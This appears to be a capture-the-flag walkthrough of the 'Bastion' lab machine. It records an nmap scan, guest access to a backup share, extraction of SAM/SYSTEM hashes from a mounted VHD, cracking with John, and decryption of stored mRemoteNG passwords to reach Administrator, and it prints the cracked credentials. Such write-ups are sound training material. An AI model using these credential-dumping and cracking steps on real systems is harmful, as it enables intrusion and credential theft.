# Bastion
## Information Gathering
#### Master List
- General Info
	- OS: Windows Server 2016 Standard 14393 (6.3)
	- Computer Name: Bastion
- /tcp445/smbmap-share-permissions.txt
	- We have Read, Write Permissions to `Backups` share
		- In /note.txt - `Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.`
		- /WindowsImageBackup/L4mpje-PC Possible username: `L4mpje`
	- Read only acess for `IPC$` share
		- IPC$ Does not allow for file listing
- Port 5985 and Port 47001 open, if we get some credentials we may be able to evil-winrm into the machine
- Got credentials `L4mpje:bureaulampje`

#### Ports/Services
x 22/tcp      ssh          
135/tcp     msrpc        
139/tcp     netbios-ssn  
445/tcp     microsoft-ds 
5985/tcp    http         
47001/tcp   http         
49664/tcp   msrpc        
49665/tcp   msrpc        
49666/tcp   msrpc        
49667/tcp   msrpc        
49668/tcp   msrpc        
49669/tcp   msrpc        
49670/tcp   msrpc

#### Software
- Port 22 OpenSSH for_Windows_7.9



## Enumeration
#### Nmap scan
```bash
PORT      STATE SERVICE      REASON          VERSION
22/tcp    open  ssh          syn-ack ttl 127 OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3bG3TRRwV6dlU1lPbviOW+3fBC7wab+KSQ0Gyhvf9Z1OxFh9v5e6GP4rt5Ss76ic1oAJPIDvQwGlKdeUEnjtEtQXB/78Ptw6IPPPPwF5dI1W4GvoGR4MV5Q6CPpJ6HLIJdvAcn3isTCZgoJT69xRK0ymPnqUqaB+/ptC4xvHmW9ptHdYjDOFLlwxg17e7Sy0CA67PW/nXu7+OKaIOx0lLn8QPEcyrYVCWAqVcUsgNNAjR4h1G7tYLVg3SGrbSmIcxlhSMexIFIVfR37LFlNIYc6Pa58lj2MSQLusIzRoQxaXO4YSp/dM1tk7CN2cKx1PTd9VVSDH+/Nq0HCXPiYh3
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBF1Mau7cS9INLBOXVd4TXFX/02+0gYbMoFzIayeYeEOAcFQrAXa1nxhHjhfpHXWEj2u0Z/hfPBzOLBGi/ngFRUg=
|   256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB34X2ZgGpYNXYb+KLFENmf0P0iQ22Q0sjws2ATjFsiN
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC

Host script results:
|_clock-skew: mean: -39m55s, deviation: 1h09m15s, median: 3s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 53299/tcp): CLEAN (Couldnt connect)
|   Check 2 (port 26941/tcp): CLEAN (Couldnt connect)
|   Check 3 (port 22326/udp): CLEAN (Timeout)
|   Check 4 (port 18741/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-08-01T23:39:42+02:00
| smb2-time: 
|   date: 2022-08-01T21:39:43
|_  start_date: 2022-08-01T12:04:12
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
```

## Exploitation

Mounted Backups share locally
```bash
$ sudo mount -t cifs -o username=guest //10.10.10.134/Backups /mnt/bastion
```

Then in /WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351 there are two .vhd files. A VHD file represents a virtual hard disk drive and essentially contains all the external storage for a machine.

Because this is a Windows machine, this means we may have access to the SAM and SYSTEM database hives. These two files contain all the users and hashes for the machine.

I can mount the larger of the two locally at /mnt/vhd.
```bash
$ guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd -v
```

After getting the SAM and SYSTEM hives, I extract the hashes from them:
```bash
$ /usr/share/creddump7/pwdump.py SYSTEM SAM > hash.txt
```
And run John to crack them
```bash
$ john hash.txt --wordlist=/usr/share/wordlist/rockyou.txt --format=NT
	bureaulampje     (L4mpje)
```

This gives me the credentials `L4mpje:bureaulampje`
I tried a few times to login using WinRM but didn't succeed. Luckily, there is SSH on this box
```
$ ssh L4mpje@10.10.10.134 (PW: bureaulampje)
```

This gets you foothold and user

## Privilege Escalation
An important thing to do whenever dropping into any machine is to check installed software. There are two main places this occurs:
- Program Files - Holds 64-bit applications
- Program FIiles (x86) - Holds 32-bit applications

Under Program Files (x86) there is a directory called "mRemoteNG". mRemoteNG is essentially a multi-protocol remote connection software for Windows. 

Whenever you find an interesting software, you should always check out the AppData associated with the software. AppData is stored at `C:\Users\<user>\AppData` and has three subdirectories which are always worth checking out for any software. When it comes specifically to privilege escalation **always check out Roaming**. Roaming contains data which is synced across multiple Windows systems.

Checking out `C:\Users\L4mpje\AppData\Roaming\mRemoteNG\` and looking at the [docs](https://mremoteng.readthedocs.io/en/v1.77.3-dev/troubleshooting.html?highlight=confCons.xml#files-and-locations) for mRemoteNG shows that confCons.xml contains encrypted passwords for sessions. 

I found [this](https://github.com/haseebT/mRemoteNG-Decrypt) decrypter online and used it after downloading the file. I of course used tried the Administrator password.
```bash
$ ./mremoteng_decrypt.py -s "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="

Password: thXLHM96BeKL0ER2
```
Which spit out the credentials `Administrator:thXLHM96BeKL0ER2`. SSH'ing using the found credentials gives priv-esc
